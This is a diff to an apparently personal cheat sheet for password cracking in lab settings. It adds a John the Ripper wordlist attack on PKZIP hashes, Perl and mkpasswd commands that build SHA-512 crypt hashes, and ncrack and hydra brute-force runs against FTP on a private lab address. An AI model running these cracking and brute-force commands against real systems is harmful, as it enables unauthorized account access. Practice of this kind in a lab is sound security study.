@@ -22,6 +22,7 @@ john --format=whirlpool --wordlist=/usr/share/wordlists/rockyou.txt hash4.txt
 john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt ntlm.txt
 john --single --format=raw-md5 hash7.txt
 john --format=NT -w=/usr/share/wordlists/rockyou.txt hash.txt --pot=output.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=PKZIP hashes
 
 # zip cracking
 zip2john zipfile > outfile
@@ -63,3 +64,11 @@ awk 'length($0) == 10' rockyou.txt > rock-10L.txt # achicar el diccionario a 10 
 
 # crackers
 ncrack -p 22 -u simeon -P wl.txt 10.10.170.245
+
+# sha-512 password creation (linux format)
+perl -e 'print crypt("password","\$6\$saltsalt\$") . "\n"'
+mkpasswd -m sha-512 Password1234
+
+# ftp cracking
+ncrack -p 21 --user ftpuser -P passwords 10.10.44.29
+hydra -l ftpuser -P passwords 10.10.44.29 ftp
